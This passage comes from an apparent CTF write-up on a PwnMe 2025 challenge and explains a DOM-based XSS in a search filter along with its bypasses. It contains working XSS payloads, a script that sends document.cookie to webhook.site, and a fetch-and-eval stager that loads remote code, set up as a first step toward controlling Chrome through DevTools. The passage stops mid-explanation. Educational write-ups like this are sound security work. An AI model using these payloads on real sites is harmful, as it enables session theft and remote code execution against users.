+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;q&#39;</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;q&#39;</span>).<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p>When the page loads, the search query is extracted using the previous function and we call another function, <code>searchArticles</code>, using that query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;DOMContentLoaded&#39;</span>, <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">searchQuery</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getSearchQuery</span>();
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;search-input&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchQuery</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">searchQuery</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">searchArticles</span>(<span style="color:#a6e22e">searchQuery</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div></li>
+<li>
+<p>The <code>searchArticles</code> function looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">searchArticles</span>(<span style="color:#a6e22e">searchInput</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;search-input&#39;</span>).<span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">trim</span>()) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">searchWords</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchInput</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">/[^\p{L}]+/u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">articles</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;.article-box&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">articles</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">article</span> =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">searchInput</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">article</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">articleText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">article</span>.<span style="color:#a6e22e">textContent</span>.<span style="color:#a6e22e">toLowerCase</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isMatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchWords</span>.<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">word</span> =&gt; <span style="color:#a6e22e">word</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">word</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;ui&#39;</span>).<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">articleText</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isMatch</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">article</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">article</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;none&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">noMatchMessage</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;no-match-message&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">found</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">searchInput</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">noMatchMessage</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`No results for &#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">searchInput</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;.`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">noMatchMessage</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;block&#39;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">noMatchMessage</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;none&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ol>
+<p>The function is vulnerable to XSS when no results are found:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">noMatchMessage</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`No results for &#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">searchInput</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;.`</span>;
+</span></span></code></pre></div><p>We need to get the function to return no results. However, notice that the search functionality acts as a naive filter that prevents us from reaching the vulnerable <code>!found</code> code path. Here is an example with a typical XSS payload:
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/hackmybot_xss_fail.png"></p>
+<p>The search functionality does a few interesting things:</p>
+<ol>
+<li>
+<p>It splits by non-letter Unicode characters (This means we remove all punctuation and special characters from the search):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// \p{L} matches a single code point in the category &#34;letter&#34;.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">searchWords</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchInput</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">/[^\p{L}]+/u</span>);
+</span></span></code></pre></div></li>
+<li>
+<p>It checks if any word in the search query is present in the code snippets on the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">articleText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">article</span>.<span style="color:#a6e22e">textContent</span>.<span style="color:#a6e22e">toLowerCase</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isMatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchWords</span>.<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">word</span> =&gt; <span style="color:#a6e22e">word</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">word</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;ui&#39;</span>).<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">articleText</span>));
+</span></span></code></pre></div></li>
+</ol>
+<p>There are many ways to bypass this trivial filter. We could have used a trivial <code>eval</code> with <code>atob</code> however this would fail because the search query is converted to lowercase at the start which breaks any Base64 encoding.</p>
+<p>Here are three possible bypasses that all run <code>alert(1)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- by @qlashx --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">oncontentvisibilityautostatechange</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval(&#34;\141\154\145\162\164\50\61\51&#34;)&#39;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">content-visibility:auto</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- by @abd0ghazy --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">video</span> <span style="color:#a6e22e">onloadstart</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eval(&#39;\141\154\145\162\164\50\61\51&#39;)&#34;</span>&gt;&lt;<span style="color:#f92672">source</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>/*&gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- by challenge author --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;#60&amp;#105&amp;#109&amp;#103&amp;#32&amp;#115&amp;#114&amp;#99&amp;#32&amp;#111&amp;#110&amp;#101&amp;#114&amp;#114&amp;#111&amp;#114&amp;#61&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&amp;#62&#34;</span>&gt;
+</span></span></code></pre></div><p>These three payloads all work for two reasons:</p>
+<ol>
+<li>The &ldquo;words&rdquo; in them like <code>input</code>, <code>iframe</code> and <code>onloadstart</code> do not exist in the articles on the page.</li>
+<li>The other parts that are included such as <code>alert(1)</code> are encoded using non-letter representations such as octal <code>\141</code> and HTML entity encoded <code>&amp;#60</code>.</li>
+</ol>
+<p>Essentially, they both allow us to bypass the filter and execute the insecure <em>No results for</em> code path:
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/hackmybot_alert1.png"></p>
+<p>What we have here is a <strong>DOM-based XSS</strong>. Why? Because without server involvement whatsoever, the client-side Javascript manipulates the user&rsquo; input allowing us to run arbitrary client-side code.</p>
+<blockquote>
+<p>Note: This currently requires user interaction, as the user has to input the search query in the search box. Let&rsquo;s see how we can weaponize it and possibly deliver it to the bot.</p>
+</blockquote>
+<h2 id="chapter-3-xss-delivery">Chapter 3: XSS Delivery<a href="#chapter-3-xss-delivery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Getting a DOM-based XSS is not big on it&rsquo;s own, until we can find a way to deliver it to our target.</p>
+<p>Remember the <code>getSearchQuery</code> function?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getSearchQuery</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Utiliser une valeur par défaut de chaîne vide si le paramètre n&#39;existe pas
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;q&#39;</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;q&#39;</span>).<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It allows us to use the <code>?q=</code> search parameter to enter our search query. For example, if we request:</p>
+<pre tabindex="0"><code>http://localhost/?q=&lt;video onloadstart=&#34;eval(&#39;\141\154\145\162\164\50\61\51&#39;)&#34;&gt;&lt;source&gt;&lt;/*&gt;
+</code></pre><p>We trigger an alert. However, this time it is <strong>deliverable</strong>. We can send it to our target!
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/hackmybot_alert1.png"></p>
+<p>Let&rsquo;s write a simple Python script to help us experiment with different payloads faster:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;setTimeout(()=&gt;{fetch(&#34;https://webhook.site/?q=&#34;+btoa(document.cookie))}, 2000)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># this will not run in Python &lt;3.12 where format strings couldn&#39;t have backslashes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># throwing: SyntaxError: f-string expression part cannot include a backslash</span>
+</span></span><span style="display:flex;"><span>xss <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;input oncontentvisibilityautostatechange=&#39;eval(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([oct(i)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> payload])<span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#39; style=content-visibility:auto&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;http://localhost/?q=&#39;</span><span style="color:#f92672">+</span>quote(xss))
+</span></span></code></pre></div><p>This encodes our payload in octal, wraps it in our <code>&lt;input&gt;</code> trigger, URL encodes it and gives us a URL that we can directly send to the bot on <code>/report</code>.</p>
+<blockquote>
+<p><strong>Note:</strong> Because of the unconventional way the cookie is set on the bot, where it is set after the bot visits our URL, there is a race condition between our XSS payload executing and the cookie setting.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;http://localhost/&#34;</span>)) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>(<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Because of that, we introduce a 2-second delay to give ample time for the cookie to be available before we exfiltrate it. This is achieved using <code>setTimeout</code> as seen above.</p>
+</blockquote>
+<p>Two seconds later, we receive a callback containing the first flag:
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/flag1.png"></p>
+<p>Nice. We got our first flag!</p>
+<h2 id="chapter-3-bot-control">Chapter 3: Bot Control<a href="#chapter-3-bot-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>So far, we found two primitives:</p>
+<ol>
+<li>A path traversal due to an off-by-slash nginx alias misconfiguration.</li>
+<li>A deliverable DOM-based XSS in the app&rsquo;s search functionality</li>
+</ol>
+<p>Our next objective is reading the second flag at <code>/root/flag2.txt</code> as seen earlier in the Dockerfile.</p>
+<p>Let&rsquo;s look at the <code>startBot</code> function we skipped over earlier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">startBot</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logFilePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">logPath</span>, <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.log`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logStream</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">createWriteStream</span>(<span style="color:#a6e22e">logFilePath</span>, { <span style="color:#a6e22e">flags</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;a&#39;</span> });
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : Attempting to open website </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\n`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headless</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;new&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">args</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;--remote-allow-origins=*&#39;</span>,<span style="color:#e6db74">&#39;--no-sandbox&#39;</span>, <span style="color:#e6db74">&#39;--disable-dev-shm-usage&#39;</span>, <span style="color:#e6db74">`--user-data-dir=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">browserCachePath</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>]
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;http://localhost/&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>(<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : Successfully opened </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\n`</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">7000</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : Finished execution\n`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logStream</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">createWriteStream</span>(<span style="color:#a6e22e">logFilePath</span>, { <span style="color:#a6e22e">flags</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;a&#39;</span> });
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : Exception occurred: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\n`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logStream</span>.<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s break down the important parts:</p>
+<ol>
+<li>We create a <code>.log</code> file at <code>${name}.log</code>, using it to log any events or errors that occur with the bot.</li>
+<li>We use Puppeteer to launch a Chrome instance, launching it with the following flags:
+<pre tabindex="0"><code>&#39;--remote-allow-origins=*&#39;
+&#39;--no-sandbox&#39;
+&#39;--disable-dev-shm-usage&#39;
+`--user-data-dir=${browserCachePath}`
+</code></pre></li>
+<li>We open the user provided URL, set the flag cookie for <code>http://localhost/</code> and sleep for 7 seconds before exiting.</li>
+</ol>
+<p>These CLI flags piqued my interest, let&rsquo;s see what <a href="https://peter.sh/experiments/chromium-command-line-switches/">each of them means</a>.</p>
+<ul>
+<li><code>--remote-allow-origins</code>: Enables web socket connections from the specified origins only. <code>'*'</code> allows any origin.</li>
+<li><code>--user-data-dir</code>: Makes Content Shell use the given path for its data directory.</li>
+<li><code>--no-sandbox</code>: Disables the sandbox for all process types that are normally sandboxed.</li>
+</ul>
+<p>Interesting. the Chrome user data directory is set to <code>/tmp/bot_folder/browser_cache/</code>. We know that we can read any file in there thanks to our path traversal primitive.</p>
+<p>Let&rsquo;s inspect our challenge locally to see what is inside the Chrome user data directory, perhaps there is something useful to grab from there:</p>
+<pre tabindex="0"><code># ls -la /tmp/bot_folder/browser_cache
+total 100
+drwxr-xr-x  1 root root  4096 Mar  5 14:40  .
+drwxr-xr-x  1 root root  4096 Mar  1 11:52  ..
+drwx------ 31 root root  4096 Mar  5 14:40  Default
+-rw-r--r--  1 root root    60 Mar  5 14:40  DevToolsActivePort
+drwx------  2 root root  4096 Mar  5 14:40  GrShaderCache
+drwx------  2 root root  4096 Mar  5 14:40  GraphiteDawnCache
+-rw-r--r--  1 root root    13 Mar  5 14:40 &#39;Last Version&#39;
+-rw-------  1 root root  3731 Mar  5 14:40 &#39;Local State&#39;
+drwx------  2 root root  4096 Mar  5 14:40 &#39;Safe Browsing&#39;
+drwx------  2 root root  4096 Mar  5 14:40  ShaderCache
+-rw-r--r--  1 root root    85 Mar  5 14:40  Variations
+-rw-------  1 root root 49152 Mar  5 14:40  first_party_sets.db
+-rw-------  1 root root     0 Mar  5 14:40  first_party_sets.db-journal
+drwx------  2 root root  4096 Mar  5 14:40  segmentation_platform
+</code></pre><p>We can see Chrome user files including disk cache and other things. We can also notice <code>DevToolsActivePort</code> which looks like this:</p>
+<pre tabindex="0"><code>33785
+/devtools/browser/4c7a5d50-9e18-45c6-8190-093bf4967eb0
+</code></pre><p>The file contains a reference to the <strong>Chrome DevTools Protocol (CDP)</strong> port. This protocol is the engine behind the Chrome DevTools:</p>
+<blockquote>
+<p>The Chrome DevTools Protocol allows for tools to instrument, inspect, debug and profile Chromium, Chrome and other Blink-based browsers. Many existing projects currently use the protocol. The Chrome DevTools uses this protocol and the team maintains its API. <a href="https://chromedevtools.github.io/devtools-protocol/">Reference</a></p>
+</blockquote>
+<p>Wow! In normal instances, Same-origin Policy (SOP) wouldn&rsquo;t allow us to connect to CDP because it lives on a different origin. However, our Chromium was launched with <code>--remote-allow-origins=*</code> which as we saw earlier <strong>enables web socket connections from any origin</strong>.</p>
+<p>Let&rsquo;s try talking to it using our earlier XSS.</p>
+<blockquote>
+<p><strong>Note:</strong> There are plenty of ways to deliver a large payload through a URL</p>
+<ol>
+<li>We could use our initial XSS to open a new same-origin window (<code>window.open</code>) then use <code>window.name</code> to deliver our complete XSS payload.</li>
+<li>We could serve our complete payload on a Cross-origin Request Sharing (CORS) enabled site, and fetch-eval the served JS using our initial payload. I will be using this option.</li>
+</ol>
+</blockquote>
+<p>Our initial XSS payload will always be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://webhook.site/&lt;id&gt;&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">text</span> =&gt; eval(<span style="color:#a6e22e">text</span>))
+</span></span></code></pre></div><p>This gives us a simple &ldquo;stager&rdquo; that allows us to freely serve the complete payload on <code>http://webhook.site/&lt;id&gt;</code>.</p>
+<p>We will first fetch the current <code>DevToolsActivePort</code>. This does not breach SOP, since the path traversal is on our same origin:</p>
